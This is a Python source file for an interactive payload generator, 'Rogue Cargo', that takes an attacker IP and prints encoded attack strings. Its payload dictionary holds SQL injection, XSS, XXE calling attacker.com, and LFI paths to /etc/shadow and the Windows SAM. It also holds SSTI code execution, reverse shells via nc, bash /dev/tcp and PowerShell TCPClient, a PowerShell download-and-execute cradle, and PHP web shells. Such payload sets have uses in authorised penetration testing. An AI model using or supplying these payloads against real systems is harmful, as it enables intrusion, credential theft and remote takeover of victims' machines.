import argparse
import os
import json
import base64
import urllib.parse
import sys
import select

def ask_question(question, options):
    print("\n")
    print(f"{question}")
    for i, option in enumerate(options, 1):
        print(f"[{i}] {option}")
    print("\n")
    
    while True:
        sys.stdout.flush()
        sys.stdout.write("RogueCargo-[~] ")
        sys.stdout.flush()
        ready, _, _ = select.select([sys.stdin], [], [], None)
        if ready:
            choice = sys.stdin.readline().strip()
            if choice.isdigit() and 1 <= int(choice) <= len(options):
                return options[int(choice) - 1]
        print("Invalid choice. Please select a valid option.")

def encode_payload(payloads, encoding_method):
    if encoding_method == "None":
        return payloads
    
    encoded_payloads = []
    for payload in payloads:
        if encoding_method == "Base64":
            encoded_payloads.append(base64.b64encode(payload.encode()).decode())
        elif encoding_method == "URL Encoding":
            encoded_payloads.append(urllib.parse.quote(payload, safe=''))
        elif encoding_method == "Hex":
            encoded_payloads.append(payload.encode().hex())
        else:
            encoded_payloads.append(payload)
    
    return encoded_payloads

def get_payloads():
    return {
        "SQL Injection": [
            "' OR '1'='1' --", 
            "admin' --", 
            "1' UNION SELECT null, username, password FROM users --",
            "1 AND SLEEP(5) --", 
            "1' AND 1=CAST((SELECT @@version) AS INT) --"
        ],
        "XSS": [
            "<script>alert('XSS')</script>",
            "\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(document.domain)>"
        ],
        "LFI": {
            "Linux": [
                "../../../../etc/passwd", 
                "../../../../var/log/apache2/access.log", 
                "/proc/self/environ",
                "/etc/hosts",
                "/etc/group",
                "/etc/shadow",
                "/root/.bash_history",
                "/var/log/auth.log"
            ],
            "Windows": [
                "C:\\Windows\\win.ini",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Windows\\repair\\sam",
                "C:\\Windows\\System32\\config\\SAM"
            ]
        },
        "XXE": [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/malicious.dtd\">]><foo>&xxe;</foo>"
        ],
        "SSRF": [
            "http://127.0.0.1:80/admin",
            "file:///etc/passwd"
        ],
        "LDAP Injection": [
            "*)(|(cn=*))", 
            "*)(|(uid=*))(|(uid=admin))"
        ],
        "Command Injection": {
            "Linux": [
                "; nc -e /bin/sh {attacker_ip} 4444",
                "| bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
                "; /bin/bash -c 'bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1'"
            ],
            "Windows": [
                "& powershell -NoP -NonI -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://{attacker_ip}/shell.ps1')\""
            ]
        },
        "SSTI": [
            "{{7*7}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
            "{{config.items()}}",
            "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}"
        ],
        "Shell": {
            "Linux": [
                "bash -i >& /dev/tcp/{attacker_ip}/4444 0>&1",
                "nc -e /bin/bash {attacker_ip} 4444"
            ],
            "Windows": [
                "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
            ]
        },
        "Web Shells": [
            "<?php system($_GET['cmd']); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<?php passthru($_GET['cmd']); ?>",
            "<?php eval($_POST['cmd']); ?>"
        ]
    }

def main():
    print("\nWelcome to Rogue Cargo 🔥\n")
    attacker_ip = input("Enter attacker IP:  ")
    
    while True:
        sys.stdout.flush()
        payloads = get_payloads()
        payload_type = ask_question("What type of payload do you need?\n", list(payloads.keys()))
        
        os_dependent = ["LFI", "Command Injection", "Shell"]
        if payload_type in os_dependent:
            os_type = ask_question("What is the target operating system?\n", ["Linux", "Windows", "Unknown"])
            selected_payloads = payloads[payload_type].get(os_type, [])
        else:
            selected_payloads = payloads.get(payload_type, [])
        
        selected_payloads = [p.replace("{attacker_ip}", attacker_ip) for p in selected_payloads]
        
        encoding_method = ask_question("Choose an encoding technique:\n", ["None", "URL Encoding", "Hex", "Base64"])
        encoded_payloads = encode_payload(selected_payloads, encoding_method)
        
        print("\n[+] Encoded Payloads:")
        for encoded_payload in encoded_payloads:
            print(f"  - {encoded_payload}")
        
        restart = ask_question("Do you want to generate another payload or exit?\n", ["Generate Another", "Exit"])
        if restart == "Exit":
            break

if __name__ == "__main__":
    main()
